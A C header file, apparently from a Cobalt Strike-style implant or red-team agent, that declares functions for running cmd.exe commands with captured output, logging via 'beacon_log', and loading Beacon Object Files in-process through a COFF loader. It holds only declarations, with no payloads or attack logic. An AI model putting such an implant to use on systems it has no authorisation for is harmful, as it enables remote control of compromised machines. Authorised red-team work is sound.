#ifndef SHELL_H
#define SHELL_H

#include <stddef.h>

/**
 * @brief Initialise the output buffer and the COFF loader. Call once at startup.
 * @return 0 on success, -1 on failure.
 */
int shell_init(void);

/**
 * @brief Free the output buffer and tear down the COFF loader.
 */
void shell_cleanup(void);

/**
 * @return Number of bytes currently in the output buffer.
 */
int shell_output_len(void);

/**
 * @return Pointer to the output buffer (not null-terminated).
 */
const char *shell_output_buf(void);

/**
 * @brief Zero and reset the output buffer without freeing it.
 */
void shell_buf_reset(void);

/**
 * @brief Append raw bytes to the output buffer. Used by the BOF compat layer.
 * @param data Bytes to append.
 * @param len  Number of bytes.
 */
void buf_append(const char *data, int len);

/**
 * @brief printf-style write into the output buffer.
 * @param fmt printf format string.
 */
void beacon_log(const char *fmt, ...);

/**
 * @brief Execute a shell command via cmd.exe /c, capturing stdout and stderr.
 *        Handles "cd" internally to track the working directory.
 * @param command Null-terminated command string.
 */
void execute_shell_command(const char *command);

/**
 * @brief Load and execute a BOF in-process via the COFF loader.
 * @param bof_data  Raw .obj bytes.
 * @param bof_size  Size of bof_data in bytes.
 * @param args      Packed BeaconPack argument buffer.
 * @param args_len  Length of args in bytes.
 * @return 0 on COFF_SUCCESS, 1 on any loader error.
 */
int execute_bof(unsigned char *bof_data, size_t bof_size,
                char *args, int args_len);

#endif /* SHELL_H */
